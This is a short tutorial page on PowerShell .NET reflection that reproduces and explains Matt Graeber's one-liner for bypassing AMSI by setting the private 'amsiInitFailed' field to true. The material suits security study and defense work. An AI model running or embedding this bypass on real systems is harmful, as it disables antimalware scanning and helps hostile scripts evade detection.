# PowerShell Reflection & AMSI Bypass

Reflection allows users or administrators to access and interact with .NET assemblies. According to Microsoft documentation:

> "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications."

.NET assemblies may seem unfamiliar, but they often take the form of common file types such as `.exe` (executable) and `.dll` (dynamic-link library).

## PowerShell Reflection Abuse

PowerShell reflection can be abused to modify or extract information from valuable DLLs. For example, the AMSI (Antimalware Scan Interface) utilities for PowerShell are stored in the `AmsiUtils` .NET assembly, located in `System.Management.Automation.AmsiUtils`.

### AMSI Bypass One-Liner

Matt Graeber published a one-liner that uses reflection to modify and bypass the AMSI utility:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Code Breakdown

- **Access the Assembly and Type:**

    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    ```

    This retrieves the `AmsiUtils` type from the assembly.

- **Get the Field:**

    ```powershell
    .GetField('amsiInitFailed','NonPublic,Static')
    ```

    This accesses the non-public static field `amsiInitFailed`.

- **Set the Field Value:**

    ```powershell
    .SetValue($null,$true)
    ```

    This sets the value of `amsiInitFailed` to `$true`.

Once the `amsiInitFailed` field is set to `$true`, AMSI will respond with the response code: `AMSI_RESULT_NOT_DETECTED = 1`.